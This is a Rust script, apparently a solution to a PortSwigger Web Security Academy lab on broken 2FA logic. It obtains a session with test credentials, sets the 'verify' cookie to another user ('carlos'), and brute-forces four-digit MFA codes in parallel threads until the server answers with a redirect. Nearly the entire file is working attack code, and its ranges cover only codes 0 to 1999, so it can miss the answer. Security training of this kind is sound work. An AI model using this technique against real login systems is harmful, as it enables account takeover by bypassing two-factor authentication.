/**********************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 28/8/2023
*
* PortSwigger LAB: 2FA Broken Logic
*
* Steps: 1. Get a valid session using valid creds
*        2. GET /login2 page
*        3. Brute force the mfa-codes
*
***********************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use rayon::prelude::*;
use regex::Regex;
use reqwest::{
    blocking::{Client, Response},
    header::HeaderMap,
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    error,
    fmt::format,
    fs,
    io::{self, Write},
    ops::Range,
    process, thread, time,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let url = "https://0aa400ea04d8ba59834a1ae6003a003e.web-security-academy.net"; // change this url to your lab
    let client = build_client(); // This client will be used in every request
    let session = get_valid_session(&client, url, "wiener", "peter"); // This session will be used to valid our requests to the server
    println!("{}", "1. Obtaining a valid session ..☑️".white().bold());
    let pre_post_code_res = fetch_login2(&client, url, "carlos", &session); // Must fetch the /login2 page to make the mfa-code be sent to the mail server
    println!("{}", "2. GET /login2 page ..☑️".white().bold());
    let ranges = build_ranges(); // get our list of ranges ready
    let start = time::Instant::now(); // capture the time before brute forcing
    println!("{}", "3. Start brute forcing mfa-code ..".white().bold());
    ranges.par_iter().for_each(|range| {
        // run every range in a different thread
        range.iter().for_each(|code| {
            // iterate over every numbers in every range
            if let Ok(post_code_res) = post_code(&client, url, "carlos", &session, *code) {
                // check if the response is Ok
                match post_code_res.status().as_u16() {
                    302 => {
                        // Redircet means that the code is correct
                        print!(
                            "\r[*] {} => {}",
                            format!("{code:04}").white().bold(),
                            "Correct".green().bold()
                        );
                        io::stdout().flush();
                        let elapased_time = (start.elapsed().as_secs() / 60).to_string();
                        println!(
                            "\n{}: {} minutes",
                            "✅ Finished in".green().bold(),
                            elapased_time.white().bold()
                        );
                        process::exit(0);
                    }
                    _ => {
                        // Code is Incorrect
                        print!(
                            "\r[*] {} => {}",
                            format!("{code:04}").white().bold(),
                            "Incorrect".red()
                        );
                        io::stdout().flush();
                    }
                }
            } else {
                // Failed to make the post code request
                println!(
                    "\r[*] {} => {}",
                    format!("{:04}", code).white().bold(),
                    "REQUEST FAILED".red()
                );
            }
        });
    });
    println!("Finished in: {:?}", start.elapsed()); // How much time the script take to finish?
}

/**************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
***************************************************************/
fn build_client() -> Client {
    reqwest::blocking::ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(time::Duration::from_secs(60))
        .build()
        .unwrap()
}

/**********************************************************
* Function used to get a valid session using correct creds
***********************************************************/
fn get_valid_session(client: &Client, url: &str, username: &str, password: &str) -> String {
    let login_post_res = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
        ]))
        .send()
        .unwrap();

    let cookie_header = login_post_res
        .headers()
        .get_all("set-cookie")
        .iter()
        .nth(1)
        .unwrap()
        .to_str()
        .unwrap();

    let re = regex::Regex::new("session=(.*); Secure").unwrap();

    re.captures(cookie_header)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}

/*********************************************************************
* Function used to build a set of ranges
* Every range will be in one thread
* Feel free to change the number of vectors and the range in each one
**********************************************************************/
fn build_ranges() -> Vec<Vec<i32>> {
    let mut list = Vec::new();
    list.push((0..500).collect::<Vec<i32>>());
    list.push((500..1000).collect::<Vec<i32>>());
    list.push((1000..2000).collect::<Vec<i32>>());
    list
}

/***********************************
* Function used to GET /login2 page
************************************/
fn fetch_login2(client: &Client, url: &str, user: &str, session: &str) -> Response {
    client
        .get(format!("{url}/login2"))
        .header("Cookie", format!("session={session}; verify={user}"))
        .send()
        .unwrap()
}

/************************************
* Function used to POST the mfa code
*************************************/
fn post_code(
    client: &Client,
    url: &str,
    user: &str,
    session: &str,
    code: i32,
) -> Result<Response, Error> {
    client
        .post(format!("{url}/login2"))
        .header("Cookie", format!("session={session}; verify={user}"))
        .form(&HashMap::from([("mfa-code", format!("{code:04}"))]))
        .send()
}

/*******************************************************************
* Reusable Function to extract session field from the cookie header
********************************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> String {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    extract_pattern("session=(.*); Secure", cookie)
}

/****************************************************
* Reusable function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
